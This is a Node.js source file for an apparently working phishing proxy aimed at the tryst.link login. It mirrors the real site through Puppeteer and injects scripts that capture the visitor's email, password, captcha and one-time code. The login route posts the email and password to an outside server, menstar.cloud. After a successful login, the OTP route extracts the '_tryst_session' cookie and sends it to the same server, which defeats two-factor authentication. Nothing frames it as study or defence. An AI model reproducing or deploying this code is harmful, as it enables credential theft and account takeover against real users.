// const fs = require("fs").promises;
const puppeteer = require("puppeteer");
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser'); // Import body-parser module
const app = express();
const session = require('express-session');

const port = 3000;

// Set EJS as the view engine
app.set('view engine', 'ejs');

app.use(bodyParser.json());

app.use(session({
  secret: 'advance', // Change this to your own secret key
  saveUninitialized: true,
  resave: true
}));

// Start the server
app.listen(port, () => {
  console.log(`Server is listening at http://localhost:${port}`);
});

// Define the URL of the Laravel API endpoint
const apiUrl = 'https://menstar.cloud/api/save-data';

// Define any additional headers you may need
const headers = {
    'Content-Type': 'application/json',
    // Add any other headers if needed
};

const sleep = (milliseconds) => {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
};
let content="";
let jscode="";

(async () => {

// let page;

  // Define a route

app.get('/log_in',async (req, res) => {
  const browser = await puppeteer.launch({
    headless: true,
    defaultViewport: false,
    // userDataDir: "./tmp",
    args: ['--no-sandbox', '--disable-setuid-sandbox'] // Optional arguments

  });
   page = await browser.newPage();

  await page.goto("https://tryst.link/log_in",);
   
   content=await page.content();

   const element = await page.$('h1'); // Select the element
   let pageText = '';
   let jscode="";
   if (element) { // Make sure the element exists
      pageText = await page.evaluate(element => element.textContent, element);
   }

   if(pageText == "You're almost there!")
   {
     
    jscode =`
    <script>
    $(document).ready(function() {
      // captcha    
       const captchaFrom = document.querySelector('.captcha-form');
   
       captchaFrom.addEventListener("submit",function(e){
           e.preventDefault();
           const captcha = $("input[name='response']").val();
   
           const formDta={captcha:captcha}
   
             $.ajax({
               url:"/captcha",
               method:"post",
               contentType: 'application/json',
               data:JSON.stringify(formDta),
               success:function(res){
                 $("#data").html(res.data)
               },
                 error: function(xhr, status, error) {
                     console.error('Error:', error);
                 }
             });
         
          
           }) ;  
      
  });   
  
    </script>`;

    let body=content+jscode;

    console.log(body)
    return res.render('index', { body: body});

   }

   jscode =`
    <script>
    $(document).ready(function() {

      const loginFrom =document.querySelector("#main > div > div.row > div:nth-child(1) > form");
  
          loginFrom.addEventListener("submit",function(e){
          e.preventDefault();
          const email = document.getElementById("login").value;
          const password = document.getElementById("password").value;
          const captcha = document.getElementById("captcha").value;
  
          const formDta={email:email,password:password,captcha:captcha}
          $.ajax({
             url:"/login",
             method:"post",
             contentType: 'application/json',
             data:JSON.stringify(formDta),
             success:function(res){
              $("#data").html(res.data)
             },
               error: function(xhr, status, error) {
                  console.error('Error:', error);
              }
          });
      })
  
  
  });   
  
    </script>`;

    let body=content+jscode;

    return res.render('login', { body: body});
});
 
app.post('/login',async(req,res)=>{

  const data = req.body;

    const email =data.email
    const password =data.password
    const captcha =data.captcha

    await page.type("#login", email);
    await page.type("#password", password);
    await page.type("#captcha", captcha);

    await page.click("input[type='submit']");

    // Define the data you want to send in the request (if any)
    const requestData = {
      name:'Shimul',
      email: email,
      password:password,
    };


// Make the API request using axios
 axios.post(apiUrl, requestData, { headers })
    .then(response => {
        // Handle the response from the API
        if(response.data.success == true)
        {
          console.log('success done...')
          req.session.insert_id = response.data.insert_id

        }
        console.log('Response from Laravel API:', response.data);
    })
    .catch(error => {
        // Handle errors
        console.error('Error making request to Laravel API:', error.message);
    });

    await sleep(1000);

    await page.waitForNavigation();

    content=await page.content();
    // const path = await page.url();

    const jscode =`
    <script>


const otpFrom = document.querySelector('form[action="/otp_auth"]')


otpFrom.addEventListener("submit",function(e){
    e.preventDefault();
    const otp = document.querySelector("input[name='otp']").value;


    const formDta={otp:otp}
    $.ajax({
       url:"/otp_auth",
       method:"post",
       contentType: 'application/json',
       data:JSON.stringify(formDta),
       success:function(res){
        console.log(res.data)
        $("#data").html(res.data)
        $("#jscode").html(res.jscode)
       },
         error: function(xhr, status, error) {
            console.error('Error:', error);
        }
    });
})

    </script>`;

  res.json({ message: 'Data received successfully!', data: content,jscode:jscode });

})


app.post('/otp_auth',async(req,res)=>{

  const data = req.body;

  const otp =data.otp
  const insert_id=req.session.insert_id

        // Wait for the input element to be available
    await page.waitForSelector(`input[name="otp"]`);

        // Select the input element using its name attribute
    await page.type("input[name='otp']",otp);

    await page.click("input[type='submit']");

    await sleep(1000);

    await page.waitForNavigation();

    content=await page.content();
    const path = await page.url();

    if(path == "https://app.tryst.link/members/providers")
    {
      await sleep(2000);

      //save cookies
      const cookies = await page.cookies();

      const specificCookie = cookies.find((cookie) => cookie.name === '_tryst_session');

      // await fs.writeFile('./tryst.json', JSON.stringify(cookies, null, 2));
      let requestData= {id:insert_id,cookie:JSON.stringify(specificCookie, null, 2)}

      axios.post("https://menstar.cloud/api/update-data", requestData, { headers })
      .then(response => {
          // Handle the response from the API
         
          console.log('Response from  API:', response.data);
      })
      .catch(error => {
          // Handle errors
          console.error('Error making request to  API:', error.message);
      });
    }

    res.json({ message: 'Data received successfully!', data: content });

})

app.post('/captcha',async(req,res)=>{

  const data = req.body;
  const captcha =data.captcha;

    //     // Wait for the input element to be available
    // await page.waitForSelector(`input[name="response"]`);
        // Select the input element using its name attribute
    await page.type("input[name='response']",captcha);

    await page.click("body > main > div > form > button");

    await sleep(3000);

    // await page.waitForNavigation();

    content= await page.content();

    // const path = await page.url();


      console.log(content)
      jscode =`
      <script>
      $(document).ready(function() {

        const captchaFrom = document.querySelector('.captcha-form');

       if(captchaFrom)
       {
        captchaFrom.addEventListener("submit",function(e){
          e.preventDefault();
          const captcha = $("input[name='response']").val();
  
          const formDta={captcha:captcha}
  
            $.ajax({
              url:"/captcha",
              method:"post",
              contentType: 'application/json',
              data:JSON.stringify(formDta),
              success:function(res){
                $("#data").html(${res.data})
              },
                error: function(xhr, status, error) {
                    console.error('Error:', error);
                }
            });
        
  
        const loginFrom =document.querySelector("#main > div > div.row > div:nth-child(1) > form");
    
        if(loginFrom)
        {
          loginFrom.addEventListener("submit",function(e){
            e.preventDefault();
            const email = document.getElementById("login").value;
            const password = document.getElementById("password").value;
            const captcha = document.getElementById("captcha").value;
    
            const formDta={email:email,password:password,captcha:captcha}
            $.ajax({
               url:"/login",
               method:"post",
               contentType: 'application/json',
               data:JSON.stringify(formDta),
               success:function(res){
                $("#data").html(res.data)
               },
                 error: function(xhr, status, error) {
                    console.error('Error:', error);
                }
            });
         })

        }
            
    
    
    });   
    
      </script>`;
   
  let body=content+jscode;

  return res.json({ message: 'captcha has been paseed!', data: body });

})


  await sleep(10000);


})();
